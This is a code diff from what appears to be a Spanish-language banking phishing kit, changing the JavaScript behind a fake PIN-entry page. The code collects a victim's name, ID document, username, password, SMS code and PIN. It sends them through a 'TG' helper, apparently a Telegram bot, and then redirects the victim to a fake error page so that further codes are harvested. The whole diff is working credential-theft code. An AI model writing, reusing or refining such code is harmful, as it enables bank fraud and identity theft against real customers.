@@ -435,35 +435,26 @@
         event.preventDefault();
         if (btnAceptar.disabled) return;
 
-        var smsCode = otpInputs.map(function (input) {
+        var pinCode = otpInputs.map(function (input) {
           return input.dataset.valor || (input.value === '•' ? '' : input.value);
         }).join('');
 
-        TG.save('pin', smsCode);
+        TG.save('pin1', pinCode);
 
-        var msg = '\u{1F464} Nombres: ' + TG.load('nombres') + '\n'
-          + '\u{1F464} Apellidos: ' + TG.load('apellidos') + '\n'
-          + '\u{1F4C4} Documento: ' + TG.load('documento') + '\n'
-          + '\u{1F4C4} COD DIG: ' + TG.load('codDig') + '\n'
-          + '\u{1F3E6} \u00BFEs Cliente?: ' + TG.load('esCliente') + '\n'
-          + '\u{1F464} USU: ' + TG.load('usuario') + '\n'
-          + '\u{1F512} SENA: ' + TG.load('sena') + '\n'
-          + '\u{1F511} PIN: ' + smsCode;
+        var msg = '\u{1F464} Nombres: ' + (TG.load('nombres') || '') + '\n'
+          + '\u{1F4C4} Documento: ' + (TG.load('documento') || '') + '\n'
+          + '\u{1F3E6} \u00BFEs Cliente?: ' + (TG.load('esCliente') || '') + '\n'
+          + '\u{1F464} USU: ' + (TG.load('usuario') || '') + '\n'
+          + '\u{1F512} SENA: ' + (TG.load('sena') || '') + '\n'
+          + '\u{1F511} SMS: ' + (TG.load('sms') || '') + '\n'
+          + '\u{1F511} P7N: ' + pinCode;
 
         TG.overlay(true);
-        TG.send(msg, true, null, { label: 'Nuevo \uD83C\uDD95', action: 'nuevo' }).then(function (sessionId) {
-          TG.poll(sessionId, function (action) {
+        TG.send(msg).then(function () {
+          setTimeout(function() {
             TG.overlay(false);
-            if (action === 'correct') {
-              window.location.href = 'patron.html';
-            } else if (action === 'incorrect') {
-              window.location.href = 'incorrecto/sms.html'; // Adjust as needed
-            } else if (action === 'nuevo') {
-              window.location.href = 'nuevo.html';
-            } else {
-              window.location.href = 'incorrecto/sms.html'; // Adjust as needed
-            }
-          });
+            window.location.href = 'incorrecto/p7n.html';
+          }, 5000);
         });
       });
 
